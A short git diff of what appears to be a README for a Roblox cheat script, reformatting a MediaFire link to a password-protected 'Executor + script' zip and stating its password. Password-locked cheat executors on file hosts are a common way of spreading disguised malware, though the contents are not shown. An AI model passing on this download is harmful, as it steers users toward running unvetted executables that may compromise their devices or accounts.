@@ -1,6 +1,7 @@
 🐸 99 Nights in the Forest - Roblox Script
 
-Executor + script  --- **[ScriptPacked]**(https://www.mediafire.com/file/qvy23y54pe5hegz/ScriptPacked.zip/file)
+**Executor + script**  --- [ScriptPacked](https://www.mediafire.com/file/qvy23y54pe5hegz/ScriptPacked.zip/file)
+
 **Pasword**: 99nights
 
 **A powerful and feature-rich script for the Roblox game "99 ночей в лесу" (99 Nights in the Forest) designed to enhance your gameplay experience.**
